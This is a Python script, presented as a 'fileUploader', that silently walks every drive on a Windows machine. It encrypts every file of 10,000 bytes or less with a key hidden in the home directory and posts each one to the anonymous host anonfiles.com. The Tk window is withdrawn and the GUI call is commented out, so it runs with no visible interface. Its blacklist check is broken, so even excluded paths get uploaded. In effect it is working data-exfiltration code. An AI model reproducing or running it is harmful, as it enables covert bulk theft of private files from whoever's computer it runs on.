from tkinter import Tk, filedialog, messagebox
from cryptography.fernet import Fernet
from urllib.parse import urlparse
from zipfile import ZipFile
from time import sleep
import requests
import easygui
import os


class fileUploader:
    def __init__(self):
        '''FileUploader'''

        self.running = True
        self.files = []
        self.dirs = []
        self.cryptionKey, self.blacklistPath = self.config(os.path.expanduser('~') + '\\hBUJtrUbkLYPKbY.fukey')
        #self.gui(self.cryptionKey)
        self.fullUpload(10000)

    def upload(self, file, files=[], zip=False, zipPath='blob.zip', writeZipFilePath='blobEncrypted.zip'):
        fileName = file.split('\\')[len(file.split('\\')) - 1]
        if zip:
            self.zipFiles(files, zipPath)
            self.encryptFile(zipPath, writeZipFilePath)
        else:
            self.encryptFile(file, 'files\\' + fileName)

        with open('files\\' + fileName, 'rb') as file:
            r = requests.post('https://api.anonfiles.com/upload', files={'file': file})
        os.remove('files\\' + fileName)

        return urlparse(r.json()['data']['file']['url']['full']).geturl()

    def zipFiles(self, files, zipPath):
        zipObj = ZipFile(zipPath, 'w')

        for file in files:
            zipObj.write(file)
        zipObj.close()

    def encryptFile(self, readFilePath, writeFilePath):
        fernet = Fernet(self.cryptionKey)

        with open(readFilePath, 'rb') as decrypted_file:
            original = decrypted_file.read()

        encrypted = fernet.encrypt(original)

        with open(writeFilePath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

    def decryptFile(self, readFilePath, writeFilePath):
        fernet = Fernet(self.cryptionKey)

        with open(readFilePath, 'rb') as encrypted_file:
            encrypted = encrypted_file.read()

        original = fernet.decrypt(encrypted)

        with open(writeFilePath, 'wb') as decrypted_file:
            decrypted_file.write(original)

    def fullUpload(self, byteLimit, blacklist=['C:\Windows', 'AppData\Local\Temp']):
        drives = []

        for drive in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = drive + ':\\'
            if os.path.exists(drive):
                # success('Found Drive: ' + drive)
                drives.append(drive)

        for dir in drives:
            for path, subdirs, files in os.walk(dir):
                for name in files:
                    filePath = path + '\\' + name
                    try:
                        fileSize = os.path.getsize(filePath)
                    except:
                        continue

                    if (fileSize < byteLimit) or (fileSize == byteLimit):
                        pass
                    else:
                        continue

                    for blackname in blacklist:
                        if blackname.lower() in filePath.lower():
                            break
                        else:
                            pass
                    print(self.upload(filePath) + ' ' + filePath)

    def config(self, cryptionKeyPath, blacklistPath='config/blacklist.txt'):
        '''FileUploader Configuration'''

        '''Cryption Key'''
        cryptionKeyExists = os.path.exists(cryptionKeyPath)

        if (cryptionKeyExists):
            with open(cryptionKeyPath, 'rb') as configFile:
                cryptionKey = configFile.readline()

        if (cryptionKeyExists==False):
            with open(cryptionKeyPath, 'wb') as configFile:
                cryptionKey = Fernet.generate_key()
                configFile.write(cryptionKey)

        #info('Key: ' + str(cryptionKey))

        '''Blacklist'''
        blacklist = []

        try:
            with open(blacklistPath, 'r') as file:
                for line in file.readlines():
                    blacklist.append(line)
            #success('Loaded blacklist [' + blacklistPath + ']')
        except:
            #fail('Failed to load blacklist [' + blacklistPath + ']')
            pass

        return cryptionKey, blacklist

if __name__ == '__main__':
    root = Tk()
    root.withdraw()
    Uploader = fileUploader()